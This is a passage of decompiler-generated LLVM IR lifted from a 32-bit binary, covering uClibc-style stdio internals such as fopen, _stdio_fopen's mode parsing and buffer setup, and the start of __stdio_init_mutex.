  %v2_804bd2a = inttoptr i32 %v1_804bd2a to i8*
  %v3_804bd2a = load i8, i8* %v2_804bd2a, align 1
  %v4_804bd2a = and i8 %v3_804bd2a, 64
  %v5_804bd2a = icmp eq i8 %v4_804bd2a, 0
  br i1 %v5_804bd2a, label %dec_label_pc_804bd39, label %dec_label_pc_804bd30

dec_label_pc_804bd30:                             ; preds = %dec_label_pc_804bd2a
  %v1_804bd30 = add i32 %v0_804bd2a, 8
  %v2_804bd30 = inttoptr i32 %v1_804bd30 to i32*
  %v3_804bd30 = load i32, i32* %v2_804bd30, align 4
  %v1_804bd33 = call i32 @free(i32 %v3_804bd30)
  br label %dec_label_pc_804bd39

dec_label_pc_804bd39:                             ; preds = %dec_label_pc_804bd2a, %dec_label_pc_804bd30
  %v4_804bd44 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134525440, i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  %v1_804bd4e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  %v0_804bd53 = load i32, i32* @global_var_80537cc.94, align 4
  %v1_804bd53 = add i32 %v0_804bd53, 1
  store i32 %v1_804bd53, i32* @global_var_80537cc.94, align 4
  %v3_804bd5c = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_804bd61 = call i32 @_stdio_openlist_dec_use()
  %v0_804bd66 = load i32, i32* @edi, align 4
  store i32 %v0_804bc7f, i32* @ebx, align 4
  store i32 %v0_804bc7e, i32* @esi, align 4
  store i32 %v0_804bc7d, i32* @edi, align 4
  store i32 %v0_804bc7c, i32* @ebp, align 4
  ret i32 %v0_804bd66

; uselistorder directives
  uselistorder i1 %v4_804bc87, { 1, 0 }
  uselistorder label %dec_label_pc_804bd39, { 1, 0 }
  uselistorder label %dec_label_pc_804bd2a, { 1, 0 }
  uselistorder label %dec_label_pc_804bcd1, { 1, 0 }
  uselistorder label %dec_label_pc_804bcc1, { 1, 0 }
  uselistorder label %dec_label_pc_804bcb1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804bd7c = inttoptr i32 %arg2 to i8*
  %v5_804bd7c = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804bd7c, i32 0, i32 -1)
  ret i32 %v5_804bd7c
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bd88 = load i32, i32* @ebp, align 4
  %v0_804bd89 = load i32, i32* @edi, align 4
  %v0_804bd8a = load i32, i32* @esi, align 4
  %v0_804bd8b = load i32, i32* @ebx, align 4
  store i32 %v0_804bd8b, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_804bd93 = ptrtoint i8* %arg2 to i32
  store i32 %arg3, i32* @edi, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_804bd9f = load i8, i8* %arg2, align 1
  %v3_804bd9f = zext i8 %v2_804bd9f to i32
  %v4_804bd9f = load i32, i32* @eax, align 4
  %v5_804bd9f = and i32 %v4_804bd9f, -256
  %v6_804bd9f = or i32 %v5_804bd9f, %v3_804bd9f
  store i32 %v6_804bd9f, i32* %eax.global-to-local, align 4
  %v10_804bda1 = icmp eq i8 %v2_804bd9f, 114
  br i1 %v10_804bda1, label %dec_label_pc_804bde1, label %dec_label_pc_804bda5

dec_label_pc_804bda5:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_804bdaa = icmp eq i8 %v2_804bd9f, 119
  br i1 %v10_804bdaa, label %dec_label_pc_804bde3, label %dec_label_pc_804bdae

dec_label_pc_804bdae:                             ; preds = %dec_label_pc_804bda5
  store i32 1089, i32* @ebx, align 4
  %v10_804bdb2 = icmp eq i8 %v2_804bd9f, 97
  br i1 %v10_804bdb2, label %dec_label_pc_804bde3, label %dec_label_pc_804bdb6

dec_label_pc_804bdb6:                             ; preds = %dec_label_pc_804be52, %dec_label_pc_804be2c, %dec_label_pc_804bdae
  %v0_804bdb6 = load i32, i32* %stack_var_-16, align 4
  %v1_804bdb6 = call i32 @__GI___errno_location(i32 %v0_804bdb6)
  store i32 %v1_804bdb6, i32* %eax.global-to-local, align 4
  %v1_804bdbb = inttoptr i32 %v1_804bdb6 to i32*
  store i32 22, i32* %v1_804bdbb, align 4
  %v0_804bdc1 = load i32, i32* @edi, align 4
  %v1_804bdc1 = icmp eq i32 %v0_804bdc1, 0
  br i1 %v1_804bdc1, label %dec_label_pc_804bf92, label %dec_label_pc_804bdc9

dec_label_pc_804bdc9:                             ; preds = %dec_label_pc_804be7a.dec_label_pc_804bdc9_crit_edge, %dec_label_pc_804bdb6
  %v0_804bdd3 = phi i32 [ %v0_804bdc9.pre, %dec_label_pc_804be7a.dec_label_pc_804bdc9_crit_edge ], [ %v0_804bdc1, %dec_label_pc_804bdb6 ]
  %v1_804bdc9 = add i32 %v0_804bdd3, 1
  %v2_804bdc9 = inttoptr i32 %v1_804bdc9 to i8*
  %v3_804bdc9 = load i8, i8* %v2_804bdc9, align 1
  %v4_804bdc9 = and i8 %v3_804bdc9, 32
  %v5_804bdc9 = icmp eq i8 %v4_804bdc9, 0
  br i1 %v5_804bdc9, label %dec_label_pc_804bf92, label %dec_label_pc_804bdd3

dec_label_pc_804bdd3:                             ; preds = %dec_label_pc_804bdc9
  %v1_804bdd4 = call i32 @free(i32 %v0_804bdd3)
  store i32 %v0_804bdd3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf94

dec_label_pc_804bde1:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804bde3

dec_label_pc_804bde3:                             ; preds = %dec_label_pc_804bdae, %dec_label_pc_804bda5, %dec_label_pc_804bde1
  %v0_804bdf4 = phi i32 [ 1089, %dec_label_pc_804bdae ], [ 577, %dec_label_pc_804bda5 ], [ 1, %dec_label_pc_804bde1 ]
  %v1_804bde3 = add i32 %v4_804bd93, 1
  store i32 %v1_804bde3, i32* %eax.global-to-local, align 4
  %v2_804bde6 = inttoptr i32 %v1_804bde3 to i8*
  %v3_804bde6 = load i8, i8* %v2_804bde6, align 1
  %v12_804bde6 = icmp eq i8 %v3_804bde6, 98
  br i1 %v12_804bde6, label %dec_label_pc_804bdee, label %dec_label_pc_804bdec

dec_label_pc_804bdec:                             ; preds = %dec_label_pc_804bde3
  store i32 %v4_804bd93, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bdee

dec_label_pc_804bdee:                             ; preds = %dec_label_pc_804bde3, %dec_label_pc_804bdec
  %v0_804bdee = phi i32 [ %v1_804bde3, %dec_label_pc_804bde3 ], [ %v4_804bd93, %dec_label_pc_804bdec ]
  %v1_804bdee = add i32 %v0_804bdee, 1
  %v2_804bdee = inttoptr i32 %v1_804bdee to i8*
  %v3_804bdee = load i8, i8* %v2_804bdee, align 1
  %v12_804bdee = icmp eq i8 %v3_804bdee, 43
  %v1_804bdf2 = icmp eq i1 %v12_804bdee, false
  br i1 %v1_804bdf2, label %dec_label_pc_804bdfc, label %dec_label_pc_804bdf4

dec_label_pc_804bdf4:                             ; preds = %dec_label_pc_804bdee
  store i32 %v0_804bdf4, i32* %eax.global-to-local, align 4
  %v1_804bdf9 = add nuw nsw i32 %v0_804bdf4, 1
  store i32 %v1_804bdf9, i32* @ebx, align 4
  br label %dec_label_pc_804bdfc

dec_label_pc_804bdfc:                             ; preds = %dec_label_pc_804bdee, %dec_label_pc_804bdf4
  %v1_804bdfc = icmp eq i32 %arg3, 0
  %v1_804bdfe = icmp eq i1 %v1_804bdfc, false
  br i1 %v1_804bdfe, label %dec_label_pc_804be28, label %dec_label_pc_804be00

dec_label_pc_804be00:                             ; preds = %dec_label_pc_804bdfc
  %v1_804be02 = call i32 @malloc(i32 80)
  store i32 %v1_804be02, i32* @edi, align 4
  store i32 80, i32* %eax.global-to-local, align 4
  %v1_804be0a = icmp eq i32 %v1_804be02, 0
  br i1 %v1_804be0a, label %dec_label_pc_804bf94, label %dec_label_pc_804be12

dec_label_pc_804be12:                             ; preds = %dec_label_pc_804be00
  %v1_804be12 = inttoptr i32 %v1_804be02 to i16*
  store i16 8192, i16* %v1_804be12, align 2
  %v0_804be17 = load i32, i32* @edi, align 4
  %v1_804be17 = add i32 %v0_804be17, 8
  %v2_804be17 = inttoptr i32 %v1_804be17 to i32*
  store i32 0, i32* %v2_804be17, align 4
  %v0_804be1e = load i32, i32* @edi, align 4
  %v1_804be1e = add i32 %v0_804be1e, 56
  store i32 %v1_804be1e, i32* @eax, align 4
  %v1_804be22 = inttoptr i32 %v1_804be1e to i32*
  %v2_804be22 = call i32 @__stdio_init_mutex(i32* %v1_804be22)
  store i32 %v1_804be1e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804bdfc, %dec_label_pc_804be12
  %v2_804be28 = icmp slt i32 %arg4, 0
  br i1 %v2_804be28, label %dec_label_pc_804be74, label %dec_label_pc_804be2c

dec_label_pc_804be2c:                             ; preds = %dec_label_pc_804be28
  %v1_804be2c = load i32, i32* @edi, align 4
  %v2_804be2c = add i32 %v1_804be2c, 4
  %v3_804be2c = inttoptr i32 %v2_804be2c to i32*
  store i32 %arg4, i32* %v3_804be2c, align 4
  %v0_804be2f = load i32, i32* @ebx, align 4
  %v1_804be31 = and i32 %v0_804be2f, 32771
  %v1_804be37 = add nuw nsw i32 %v1_804be31, 1
  %v0_804be38 = load i32, i32* @esi, align 4
  %v1_804be38 = add i32 %v0_804be38, 1
  %v2_804be3b = and i32 %v1_804be38, %v1_804be37
  store i32 %v2_804be3b, i32* %eax.global-to-local, align 4
  %v12_804be3d = icmp eq i32 %v2_804be3b, %v1_804be37
  %v1_804be3f = icmp eq i1 %v12_804be3d, false
  br i1 %v1_804be3f, label %dec_label_pc_804bdb6, label %dec_label_pc_804be45

dec_label_pc_804be45:                             ; preds = %dec_label_pc_804be2c
  %v1_804be47 = and i32 %v0_804be38, 1024
  %v1_804be49 = xor i32 %v1_804be47, 1024
  store i32 %v1_804be49, i32* %eax.global-to-local, align 4
  %v2_804be4e = and i32 %v1_804be49, %v0_804be2f
  %v3_804be4e = icmp eq i32 %v2_804be4e, 0
  br i1 %v3_804be4e, label %dec_label_pc_804be6a, label %dec_label_pc_804be52

dec_label_pc_804be52:                             ; preds = %dec_label_pc_804be45
  store i32 %arg4, i32* %stack_var_-60, align 4
  %v2_804be5a = load i32, i32* %stack_var_-48, align 4
  %v3_804be5a = call i32 @__libc_fcntl(i32 4, i32 1024, i32 %v2_804be5a)
  store i32 %v3_804be5a, i32* %eax.global-to-local, align 4
  %v1_804be62 = icmp eq i32 %v3_804be5a, 0
  %v1_804be64 = icmp eq i1 %v1_804be62, false
  br i1 %v1_804be64, label %dec_label_pc_804bdb6, label %dec_label_pc_804be52.dec_label_pc_804be6a_crit_edge

dec_label_pc_804be52.dec_label_pc_804be6a_crit_edge: ; preds = %dec_label_pc_804be52
  %v0_804be6a.pre = load i32, i32* @esi, align 4
  %v0_804be70.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804be6a

dec_label_pc_804be6a:                             ; preds = %dec_label_pc_804be52.dec_label_pc_804be6a_crit_edge, %dec_label_pc_804be45
  %v0_804be70 = phi i32 [ %v0_804be70.pre, %dec_label_pc_804be52.dec_label_pc_804be6a_crit_edge ], [ %v0_804be2f, %dec_label_pc_804be45 ]
  %v0_804be6a = phi i32 [ %v0_804be6a.pre, %dec_label_pc_804be52.dec_label_pc_804be6a_crit_edge ], [ %v0_804be38, %dec_label_pc_804be45 ]
  %v1_804be6a = and i32 %v0_804be6a, 32768
  store i32 %v1_804be6a, i32* @esi, align 4
  %v2_804be70 = or i32 %v1_804be6a, %v0_804be70
  br label %dec_label_pc_804be94

dec_label_pc_804be74:                             ; preds = %dec_label_pc_804be28
  %v1_804be74 = add i32 %arg4, 1
  %v8_804be74 = icmp eq i32 %v1_804be74, 0
  store i32 %v1_804be74, i32* @ebp, align 4
  %v0_804be7f.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804be74, label %dec_label_pc_804be7a, label %dec_label_pc_804be77

dec_label_pc_804be77:                             ; preds = %dec_label_pc_804be74
  %v11_804be77 = or i32 %v0_804be7f.pre, 32768
  store i32 %v11_804be77, i32* @ebx, align 4
  br label %dec_label_pc_804be7a

dec_label_pc_804be7a:                             ; preds = %dec_label_pc_804be74, %dec_label_pc_804be77
  %v0_804be7f = phi i32 [ %v11_804be77, %dec_label_pc_804be77 ], [ %v0_804be7f.pre, %dec_label_pc_804be74 ]
  %v0_804be80 = load i32, i32* @esi, align 4
  store i32 %v0_804be80, i32* %stack_var_-60, align 4
  %v3_804be81 = inttoptr i32 %v0_804be80 to i8*
  %v4_804be81 = call i32 @__GI_open(i8* %v3_804be81, i32 %v0_804be7f)
  store i32 %v4_804be81, i32* %eax.global-to-local, align 4
  %v1_804be86 = load i32, i32* @edi, align 4
  %v2_804be86 = add i32 %v1_804be86, 4
  %v3_804be86 = inttoptr i32 %v2_804be86 to i32*
  store i32 %v4_804be81, i32* %v3_804be86, align 4
  %v2_804be8c = icmp slt i32 %v4_804be81, 0
  br i1 %v2_804be8c, label %dec_label_pc_804be7a.dec_label_pc_804bdc9_crit_edge, label %dec_label_pc_804be7a.dec_label_pc_804be94_crit_edge

dec_label_pc_804be7a.dec_label_pc_804bdc9_crit_edge: ; preds = %dec_label_pc_804be7a
  %v0_804bdc9.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804bdc9

dec_label_pc_804be7a.dec_label_pc_804be94_crit_edge: ; preds = %dec_label_pc_804be7a
  %v0_804be94.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804be94

dec_label_pc_804be94:                             ; preds = %dec_label_pc_804be7a.dec_label_pc_804be94_crit_edge, %dec_label_pc_804be6a
  %v0_804bea3 = phi i32 [ %v0_804be94.pre, %dec_label_pc_804be7a.dec_label_pc_804be94_crit_edge ], [ %v2_804be70, %dec_label_pc_804be6a ]
  %v8_804be96 = and i32 %v0_804bea3, 33792
  %v0_804be9b = load i32, i32* @edi, align 4
  %v1_804be9b = inttoptr i32 %v0_804be9b to i32*
  %v2_804be9b = load i32, i32* %v1_804be9b, align 4
  %v7_804be9d = and i32 %v2_804be9b, 8192
  %v2_804bea1 = or i32 %v7_804be9d, %v8_804be96
  %v1_804bea3 = urem i32 %v0_804bea3, 4
  %v1_804bea6 = mul nuw nsw i32 %v1_804bea3, 16
  %v1_804bea9 = add nuw nsw i32 %v1_804bea6, 16
  %v2_804beac = xor i32 %v1_804bea9, 48
  store i32 %v2_804beac, i32* %eax.global-to-local, align 4
  %v2_804beaf = or i32 %v2_804bea1, %v2_804beac
  %v1_804beb1 = trunc i32 %v2_804beaf to i16
  %v3_804beb1 = inttoptr i32 %v0_804be9b to i16*
  store i16 %v1_804beb1, i16* %v3_804beb1, align 2
  %v0_804beb4 = load i32, i32* @edi, align 4
  %v1_804beb4 = add i32 %v0_804beb4, 4
  %v2_804beb4 = inttoptr i32 %v1_804beb4 to i32*
  %v3_804beb4 = load i32, i32* %v2_804beb4, align 4
  store i32 %v3_804beb4, i32* @ebx, align 4
  %v9_804beb7 = icmp eq i32 %v3_804beb4, 2147483647
  br i1 %v9_804beb7, label %dec_label_pc_804beda, label %dec_label_pc_804bebf

dec_label_pc_804bebf:                             ; preds = %dec_label_pc_804be94
  %v0_804bebf = load i32, i32* %stack_var_-60, align 4
  %v1_804bebf = call i32 @__GI___errno_location(i32 %v0_804bebf)
  store i32 %v1_804bebf, i32* %eax.global-to-local, align 4
  store i32 %v1_804bebf, i32* @esi, align 4
  %v1_804bec6 = inttoptr i32 %v1_804bebf to i32*
  %v2_804bec6 = load i32, i32* %v1_804bec6, align 4
  store i32 %v2_804bec6, i32* @ebp, align 4
  %v0_804bec8 = load i32, i32* @ebx, align 4
  %v1_804bec9 = call i32 @isatty(i32 %v0_804bec8)
  store i32 %v1_804bec9, i32* %eax.global-to-local, align 4
  store i32 %v0_804bec8, i32* @ecx, align 4
  %v1_804becf = icmp eq i32 %v1_804bec9, 0
  br i1 %v1_804becf, label %dec_label_pc_804bed8, label %dec_label_pc_804bed3

dec_label_pc_804bed3:                             ; preds = %dec_label_pc_804bebf
  %v0_804bed3 = load i32, i32* @edi, align 4
  %v1_804bed3 = inttoptr i32 %v0_804bed3 to i16*
  %v2_804bed3 = load i16, i16* %v1_804bed3, align 2
  %v3_804bed3 = or i16 %v2_804bed3, 256
  store i16 %v3_804bed3, i16* %v1_804bed3, align 2
  br label %dec_label_pc_804bed8

dec_label_pc_804bed8:                             ; preds = %dec_label_pc_804bebf, %dec_label_pc_804bed3
  %v0_804bed8 = load i32, i32* @ebp, align 4
  %v1_804bed8 = load i32, i32* @esi, align 4
  %v2_804bed8 = inttoptr i32 %v1_804bed8 to i32*
  store i32 %v0_804bed8, i32* %v2_804bed8, align 4
  %v0_804beda.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804beda

dec_label_pc_804beda:                             ; preds = %dec_label_pc_804be94, %dec_label_pc_804bed8
  %v0_804beda = phi i32 [ %v0_804beb4, %dec_label_pc_804be94 ], [ %v0_804beda.pre, %dec_label_pc_804bed8 ]
  %v1_804beda = add i32 %v0_804beda, 8
  %v2_804beda = inttoptr i32 %v1_804beda to i32*
  %v3_804beda = load i32, i32* %v2_804beda, align 4
  %v4_804beda = icmp eq i32 %v3_804beda, 0
  %v1_804bede = icmp eq i1 %v4_804beda, false
  br i1 %v1_804bede, label %dec_label_pc_804bf08, label %dec_label_pc_804bee0

dec_label_pc_804bee0:                             ; preds = %dec_label_pc_804beda
  %v1_804bee5 = call i32 @malloc(i32 4096)
  store i32 %v1_804bee5, i32* %eax.global-to-local, align 4
  %v1_804beea = load i32, i32* @edi, align 4
  %v2_804beea = add i32 %v1_804beea, 8
  %v3_804beea = inttoptr i32 %v2_804beea to i32*
  store i32 %v1_804bee5, i32* %v3_804beea, align 4
  %v1_804beee = icmp eq i32 %v1_804bee5, 0
  br i1 %v1_804beee, label %dec_label_pc_804bf01, label %dec_label_pc_804bef2

dec_label_pc_804bef2:                             ; preds = %dec_label_pc_804bee0
  %v1_804bef2 = add i32 %v1_804bee5, 4096
  store i32 %v1_804bef2, i32* %eax.global-to-local, align 4
  %v1_804bef7 = load i32, i32* @edi, align 4
  %v2_804bef7 = add i32 %v1_804bef7, 12
  %v3_804bef7 = inttoptr i32 %v2_804bef7 to i32*
  store i32 %v1_804bef2, i32* %v3_804bef7, align 4
  %v0_804befa = load i32, i32* @edi, align 4
  %v1_804befa = inttoptr i32 %v0_804befa to i16*
  %v2_804befa = load i16, i16* %v1_804befa, align 2
  %v3_804befa = or i16 %v2_804befa, 16384
  store i16 %v3_804befa, i16* %v1_804befa, align 2
  br label %dec_label_pc_804bf08

dec_label_pc_804bf01:                             ; preds = %dec_label_pc_804bee0
  %v0_804bf01 = load i32, i32* @edi, align 4
  %v1_804bf01 = add i32 %v0_804bf01, 12
  %v2_804bf01 = inttoptr i32 %v1_804bf01 to i32*
  store i32 0, i32* %v2_804bf01, align 4
  br label %dec_label_pc_804bf08

dec_label_pc_804bf08:                             ; preds = %dec_label_pc_804beda, %dec_label_pc_804bef2, %dec_label_pc_804bf01
  %v0_804bf08 = load i32, i32* @edi, align 4
  %v1_804bf08 = add i32 %v0_804bf08, 8
  %v2_804bf08 = inttoptr i32 %v1_804bf08 to i32*
  %v3_804bf08 = load i32, i32* %v2_804bf08, align 4
  store i32 %v3_804bf08, i32* %eax.global-to-local, align 4
  %v2_804bf0b = add i32 %v0_804bf08, 24
  %v3_804bf0b = inttoptr i32 %v2_804bf0b to i32*
  store i32 %v3_804bf08, i32* %v3_804bf0b, align 4
  %v0_804bf0e = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf0e = load i32, i32* @edi, align 4
  %v2_804bf0e = add i32 %v1_804bf0e, 28
  %v3_804bf0e = inttoptr i32 %v2_804bf0e to i32*
  store i32 %v0_804bf0e, i32* %v3_804bf0e, align 4
  %v0_804bf11 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf11 = load i32, i32* @edi, align 4
  %v2_804bf11 = add i32 %v1_804bf11, 16
  %v3_804bf11 = inttoptr i32 %v2_804bf11 to i32*
  store i32 %v0_804bf11, i32* %v3_804bf11, align 4
  %v0_804bf14 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf14 = load i32, i32* @edi, align 4
  %v2_804bf14 = add i32 %v1_804bf14, 20
  %v3_804bf14 = inttoptr i32 %v2_804bf14 to i32*
  store i32 %v0_804bf14, i32* %v3_804bf14, align 4
  %v0_804bf17 = load i32, i32* @edi, align 4
  %v1_804bf17 = add i32 %v0_804bf17, 2
  %v2_804bf17 = inttoptr i32 %v1_804bf17 to i8*
  store i8 0, i8* %v2_804bf17, align 1
  %v0_804bf1b = load i32, i32* @edi, align 4
  %v1_804bf1b = add i32 %v0_804bf1b, 44
  %v2_804bf1b = inttoptr i32 %v1_804bf1b to i32*
  store i32 0, i32* %v2_804bf1b, align 4
  %v0_804bf22 = load i32, i32* @global_var_805348c.95, align 4
  store i32 %v0_804bf22, i32* %eax.global-to-local, align 4
  %v1_804bf27 = load i32, i32* @edi, align 4
  %v2_804bf27 = add i32 %v1_804bf27, 52
  %v3_804bf27 = inttoptr i32 %v2_804bf27 to i32*
  store i32 %v0_804bf22, i32* %v3_804bf27, align 4
  %v0_804bf2a = load i32, i32* @edi, align 4
  %v1_804bf2a = add i32 %v0_804bf2a, 1
  %v2_804bf2a = inttoptr i32 %v1_804bf2a to i8*
  %v3_804bf2a = load i8, i8* %v2_804bf2a, align 1
  %v4_804bf2a = and i8 %v3_804bf2a, 32
  %v5_804bf2a = icmp eq i8 %v4_804bf2a, 0
  br i1 %v5_804bf2a, label %dec_label_pc_804bf94, label %dec_label_pc_804bf30

dec_label_pc_804bf30:                             ; preds = %dec_label_pc_804bf08
  %v2_804bf3a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bf3a, i32* %stack_var_-60, align 4
  %v4_804bf3f = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134525440, i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  store i32 %v4_804bf3f, i32* %eax.global-to-local, align 4
  %v1_804bf49 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  store i32 %v1_804bf49, i32* %eax.global-to-local, align 4
  %v4_804bf5d = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134525440, i32 ptrtoint (i32* @global_var_805345c.96 to i32))
  store i32 %v4_804bf5d, i32* %eax.global-to-local, align 4
  %v1_804bf67 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805345c.96 to i32))
  %v0_804bf6c = load i32, i32* bitcast (i32** @global_var_8053458.97 to i32*), align 8
  store i32 %v0_804bf6c, i32* %eax.global-to-local, align 4
  %v1_804bf71 = load i32, i32* @edi, align 4
  %v2_804bf71 = add i32 %v1_804bf71, 32
  %v3_804bf71 = inttoptr i32 %v2_804bf71 to i32*
  store i32 %v0_804bf6c, i32* %v3_804bf71, align 4
  %v0_804bf74 = load i32, i32* @edi, align 4
  store i32 %v0_804bf74, i32* bitcast (i32** @global_var_8053458.97 to i32*), align 8
  %v3_804bf80 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  store i32 %v3_804bf80, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-60, align 4
  %v3_804bf88 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_804bf88, i32* %eax.global-to-local, align 4
  %v0_804bf94.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804bf94

dec_label_pc_804bf92:                             ; preds = %dec_label_pc_804bdc9, %dec_label_pc_804bdb6
  br label %dec_label_pc_804bf94

dec_label_pc_804bf94:                             ; preds = %dec_label_pc_804bf08, %dec_label_pc_804be00, %dec_label_pc_804bf30, %dec_label_pc_804bdd3, %dec_label_pc_804bf92
  %v0_804bf94 = phi i32 [ %v0_804bf2a, %dec_label_pc_804bf08 ], [ 0, %dec_label_pc_804be00 ], [ %v0_804bf94.pre, %dec_label_pc_804bf30 ], [ 0, %dec_label_pc_804bdd3 ], [ 0, %dec_label_pc_804bf92 ]
  store i32 %v0_804bf94, i32* %eax.global-to-local, align 4
  store i32 %v0_804bd8a, i32* @esi, align 4
  store i32 %v0_804bd89, i32* @edi, align 4
  store i32 %v0_804bd88, i32* @ebp, align 4
  ret i32 %v0_804bf94

; uselistorder directives
  uselistorder i32 %v0_804bf94, { 1, 0 }
  uselistorder i32 %v11_804be77, { 1, 0 }
  uselistorder i32 %v0_804be7f.pre, { 1, 0 }
  uselistorder i32 %v0_804be38, { 1, 0, 2 }
  uselistorder i32 %v1_804be37, { 1, 0 }
  uselistorder i32 %v0_804be2f, { 1, 0, 2 }
  uselistorder i32 %v0_804bdf4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28 }
  uselistorder i32 4096, { 5, 3, 6, 0, 7, 8, 1, 4, 2 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 6, 1, 5, 4, 3, 2 }
  uselistorder i32 %arg4, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_804bf94, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804bf08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804beda, { 1, 0 }
  uselistorder label %dec_label_pc_804bed8, { 1, 0 }
  uselistorder label %dec_label_pc_804be7a, { 1, 0 }
  uselistorder label %dec_label_pc_804be28, { 1, 0 }
  uselistorder label %dec_label_pc_804bdfc, { 1, 0 }
  uselistorder label %dec_label_pc_804bdee, { 1, 0 }
  uselistorder label %dec_label_pc_804bde3, { 2, 0, 1 }
}

define i32 @__stdio_init_mutex(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_804bfa1 = load i32, i32* @esi, align 4
  store i32 %v0_804bfa1, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* %edi.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8051294.98 to i32), i32* %esi.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v7_804bfab = load i1, i1* @df, align 1
  %v8_804bfab = select i1 %v7_804bfab, i32 -4, i32 4
  %v9_804bfab = add i32 %v8_804bfab, %tmp1
  %v10_804bfab = add i32 %v8_804bfab, ptrtoint (i32* @global_var_8051294.98 to i32)
  store i32 %v9_804bfab, i32* %edi.global-to-local, align 4
  store i32 %v10_804bfab, i32* %esi.global-to-local, align 4
  %v1_804bfac = inttoptr i32 %v10_804bfab to i32*
  %v2_804bfac = load i32, i32* %v1_804bfac, align 4
  %v4_804bfac = inttoptr i32 %v9_804bfab to i32*
  store i32 %v2_804bfac, i32* %v4_804bfac, align 4
  %v5_804bfac = load i32, i32* %edi.global-to-local, align 4
  %v6_804bfac = load i32, i32* %esi.global-to-local, align 4
  %v9_804bfac = add i32 %v5_804bfac, %v8_804bfab
  %v10_804bfac = add i32 %v6_804bfac, %v8_804bfab
  store i32 %v9_804bfac, i32* %edi.global-to-local, align 4
  store i32 %v10_804bfac, i32* %esi.global-to-local, align 4
  %v1_804bfad = inttoptr i32 %v10_804bfac to i32*
  %v2_804bfad = load i32, i32* %v1_804bfad, align 4
  %v4_804bfad = inttoptr i32 %v9_804bfac to i32*
  store i32 %v2_804bfad, i32* %v4_804bfad, align 4
  %v5_804bfad = load i32, i32* %edi.global-to-local, align 4
  %v6_804bfad = load i32, i32* %esi.global-to-local, align 4
  %v9_804bfad = add i32 %v5_804bfad, %v8_804bfab
  %v10_804bfad = add i32 %v6_804bfad, %v8_804bfab
  store i32 %v9_804bfad, i32* %edi.global-to-local, align 4
  store i32 %v10_804bfad, i32* %esi.global-to-local, align 4
  %v1_804bfae = inttoptr i32 %v10_804bfad to i32*
  %v2_804bfae = load i32, i32* %v1_804bfae, align 4
  %v4_804bfae = inttoptr i32 %v9_804bfad to i32*
  store i32 %v2_804bfae, i32* %v4_804bfae, align 4
  %v5_804bfae = load i32, i32* %edi.global-to-local, align 4
  %v6_804bfae = load i32, i32* %esi.global-to-local, align 4
  %v9_804bfae = add i32 %v5_804bfae, %v8_804bfab
  %v10_804bfae = add i32 %v6_804bfae, %v8_804bfab
  store i32 %v9_804bfae, i32* %edi.global-to-local, align 4
  store i32 %v10_804bfae, i32* %esi.global-to-local, align 4
  %v1_804bfaf = inttoptr i32 %v10_804bfae to i32*
  %v2_804bfaf = load i32, i32* %v1_804bfaf, align 4
  %v4_804bfaf = inttoptr i32 %v9_804bfae to i32*
  store i32 %v2_804bfaf, i32* %v4_804bfaf, align 4
  %v5_804bfaf = load i32, i32* %edi.global-to-local, align 4
  %v6_804bfaf = load i32, i32* %esi.global-to-local, align 4
  %v9_804bfaf = add i32 %v5_804bfaf, %v8_804bfab
